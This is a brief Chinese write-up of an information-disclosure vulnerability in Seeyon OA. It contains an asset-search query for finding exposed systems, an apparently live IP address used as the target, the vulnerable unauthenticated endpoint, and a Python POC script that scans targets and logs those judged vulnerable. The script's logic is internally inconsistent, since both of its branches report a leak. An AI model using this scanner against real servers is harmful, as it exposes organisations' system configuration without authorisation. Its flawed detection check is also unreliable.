## 一、资产搜索

```
app="致远互联-OA"
```

## 二、网站测试

```
http://121.199.0.42:8086
```

## 三、验证漏洞

```
/seeyon/rest/m3/common/system/properties
```

![image-20240908181329558](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240908181329558.png)

## 四、POC

```
def poc(target):
    payload = "/seeyon/rest/m3/common/system/properties"
    res1 = requests.get(url=target,verify=False,timeout=5)
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    try:
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,verify=False,timeout=5)
            res3 = json.loads(res2.text)
            print("注意：如果网站不存在信息泄露，则会输出data")
            if res3['data']['sms.cmpp3.host'] == '':
                with open("result.txt",'a',encoding='utf-8') as f:
                    f.write(f"[+]{target}\n")
                    f.close()
                    print(f"[+]该网站{target}存在信息泄露")
            elif res3['data']['sms.cmpp3.host'] != '':
                print(f"[-]该网站{target}存在信息泄露")
        else:
            print("访问超时，请手动测试！！！")
    except Exception as e:
        print(e)
```

## 五、测试结果

![image-20240908181443383](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240908181443383.png)

![image-20240908183751286](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240908183751286.png)

